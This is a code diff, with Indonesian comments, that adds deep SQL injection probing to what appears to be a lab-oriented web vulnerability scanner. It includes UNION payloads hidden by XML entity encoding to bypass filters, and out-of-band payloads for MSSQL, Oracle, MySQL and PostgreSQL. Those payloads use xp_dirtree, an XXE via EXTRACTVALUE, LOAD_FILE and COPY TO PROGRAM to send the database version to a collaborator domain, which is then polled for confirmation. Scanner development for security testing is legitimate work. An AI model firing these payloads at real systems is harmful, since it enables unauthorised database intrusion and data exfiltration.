+    base_xml = "<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"
+    for url in endpoints:
+        baseline = _sqli_http(sess, ctx, "POST", url, data=base_xml,
+                              headers={"Content-Type": "application/xml"})
+        if baseline is None:
+            return
+        literal = base_xml.replace("<storeId>1</storeId>",
+                                   "<storeId>1 UNION SELECT NULL</storeId>")
+        encoded = base_xml.replace("<storeId>1</storeId>",
+                                   "<storeId>1 &#x55;NION &#x53;ELECT NULL</storeId>")
+        resp_literal = _sqli_http(sess, ctx, "POST", url, data=literal,
+                                  headers={"Content-Type": "application/xml"})
+        resp_encoded = _sqli_http(sess, ctx, "POST", url, data=encoded,
+                                  headers={"Content-Type": "application/xml"})
+        if resp_literal is None or resp_encoded is None:
+            return
+        blocked_literal = (resp_literal.status_code in (400, 403, 406, 429)
+                           or "blocked" in _sqli_body(resp_literal).lower()
+                           or "not acceptable" in _sqli_body(resp_literal).lower())
+        advanced_encoded = (resp_encoded.status_code != resp_literal.status_code
+                            or _sqli_len(resp_encoded) != _sqli_len(resp_literal))
+        if blocked_literal and advanced_encoded:
+            out.append(_sqli_finding(
+                ctx, {"xml_encoded"},
+                "SQL injection dengan bypass filter melalui XML entity encoding", "high",
+                f"Payload literal ditolak (HTTP {resp_literal.status_code}) tetapi versi "
+                f"entity-encoded diterima/diproses berbeda (HTTP {resp_encoded.status_code}, "
+                f"{_sqli_len(resp_encoded)} byte) pada {url}.",
+                "active_sqli_xml_entity_bypass"))
+            return
+        if _sqli_dbms(resp_encoded)[0] and not _sqli_dbms(baseline)[0]:
+            out.append(_sqli_finding(
+                ctx, {"xml_encoded"},
+                "SQL injection pada body XML (entity-encoded) — error database terpicu", "high",
+                f"Body XML dengan payload entity-encoded memicu error SQL pada {url}: "
+                f"\"{_snip(_sqli_body(resp_encoded), _sqli_dbms(resp_encoded)[1])}\"",
+                "active_sqli_xml_entity_error"))
+            return
+
+
+# ── 9. out-of-band ──────────────────────────────────────────────────────────
+def _sqli_oast_poll() -> list[str]:
+    if not SQLI_OAST_API:
+        return []
+    interactions: list[str] = []
+    for _ in range(3):
+        try:
+            resp = requests.get(SQLI_OAST_API, timeout=6, headers={"User-Agent": UA})
+            if resp.ok:
+                interactions.append(resp.text[:4000])
+        except Exception:
+            pass
+        time.sleep(2)
+    return interactions
+
+
+def _sqli_oob_phase(sess, ctx, points, out):
+    domain = SQLI_OAST_DOMAIN
+    if not domain or not points:
+        return
+    payloads = [
+        ("mssql", "'; DECLARE @q varchar(200); SET @q='\\\\'+(SELECT @@version)+'." + domain +
+                  "\\a'; EXEC master..xp_dirtree @q--"),
+        ("oracle", "' AND (SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?><!DOCTYPE root "
+                   "[<!ENTITY % r SYSTEM \"http://" + domain + "/\">%r;]>'),'/l') FROM dual)--"),
+        ("mysql", "' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT version()),'." + domain +
+                  "\\\\a')))-- -"),
+        ("postgresql", "'; COPY (SELECT '') TO PROGRAM 'nslookup " + domain + "'--"),
+    ]
+    sent = 0
+    for point in points[:3]:
+        for _dbms, payload in payloads:
+            if _sqli_send(sess, ctx, point, _sqli_value(point, payload)) is not None:
+                sent += 1
+    if not sent:
+        return
+    hits = _sqli_oast_poll()
+    if any(domain in hit.lower() for hit in hits):
+        out.append(_sqli_finding(
+            ctx, {"oob"},
+            "Blind SQL injection dengan interaksi out-of-band terkonfirmasi", "high",
+            f"Payload DNS/UNC ke domain collaborator {domain} memicu interaksi yang tercatat "
+            "pada endpoint OAST.",
+            "active_sqli_oob_interaction"))
+        return
+    out.append(_sqli_finding(
+        ctx, {"oob"},
+        "SQL injection out-of-band dikirim, menunggu interaksi collaborator", "medium",
+        f"{sent} payload OOB dikirim ke domain {domain}; interaksi belum terlihat pada "
+        "endpoint OAST sehingga exfiltrasi belum terbukti.",
+        "active_sqli_oob_pending", confidence="candidate"))
+
+
+# ── orkestrasi probe SQLi ───────────────────────────────────────────────────
+@active("sqli")
+def a_sqli_deep(ctx):
+    if not _sqli_take(ctx):
+        return []
+    findings: list[dict] = []
+    session = requests.Session()
+    session.headers.update({"User-Agent": UA})
+    try:
+        session.get(ctx.url, timeout=ACTIVE_TIMEOUT, allow_redirects=False)
+    except Exception:
+        pass
+
+    try:
+        _sqli_login_phase(session, ctx, findings)
+    except Exception:
+        pass
+
+    points = _sqli_points(ctx)
+    time_done = _sqli_budget_key(ctx) in _SQLI_TIME_HOSTS or bool(
+        any("time_based" in f.get("tags", []) for f in findings))
+    union_done = False
+    for index, point in enumerate(points):
+        if not _sqli_take(ctx):
+            break
+        base = _sqli_send(session, ctx, point, point["value"])
+        if base is None or base.status_code >= 500:
+            continue
+        try:
+            _sqli_error_phase(session, ctx, point, base, findings)
+            _sqli_boolean_phase(session, ctx, point, base, findings)
+            _sqli_cond_error_phase(session, ctx, point, base, findings)
+            _sqli_where_phase(session, ctx, point, base, findings)
+            if not union_done and index < 3:
+                _sqli_union_phase(session, ctx, point, base, findings)
+                union_done = bool(any("union" in f.get("tags", []) for f in findings))
+            if not time_done and index < 3:
+                _sqli_time_phase(session, ctx, point, base, findings)
+                time_done = bool(any("time_based" in f.get("tags", []) for f in findings))
+                if time_done:
+                    _SQLI_TIME_HOSTS.add(_sqli_budget_key(ctx))
+        except Exception as exc:
+            ctx.http_log.append({"phase": "sqli", "error": f"{type(exc).__name__}: {exc}"[:200]})
+
+    try:
+        _sqli_xml_phase(session, ctx, findings)
+    except Exception:
+        pass
+    try:
+        _sqli_oob_phase(session, ctx, points, findings)
+    except Exception:
+        pass
+    return _dedupe_findings(findings)
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -4128,6 +4771,11 @@ PROVABLE_TAGS: frozenset = frozenset({
     "union", "login_bypass", "admin_panel", "idor", "role_param", "api_docs",
     "mass_assignment", "cookie_bruteforce", "password_reset", "two_fa",
     "client_side_trust", "coupon_reuse", "negative_quantity", "path_mapping",
+    # SQL injection — skenario mendalam
+    "where", "oracle", "mysql_mssql", "db_dump", "db_version", "column_count",
+    "text_column", "other_tables", "multi_value", "conditional_responses",
+    "conditional_errors", "xml_encoded", "information_schema", "all_tables",
+    "oob",
     "unkeyed_header", "null_origin", "protocol_confusion", "no_csrf_defense",
     "java_gadget", "php_object", "ruby_gadget", "serialized_object", "dom_clobbering",
     "open_redirect", "cookie_manipulation", "content_type_bypass", "webshell",
@@ -4390,6 +5038,8 @@ def _discover_same_origin_contexts(root_ctx: TargetContext, max_pages: int = 80)
 
 
 def run_lab_scan(ctx) -> dict[str, Any]:
+    _SQLI_HOST_BUDGET.clear()
+    _SQLI_TIME_HOSTS.clear()
     # Cakupan bukan hanya halaman awal: jelajahi tautan, halaman, dan form GET
     # pada origin yang sama, lalu jalankan keluarga probe pada setiap konteks.
     page_contexts = _discover_same_origin_contexts(ctx)
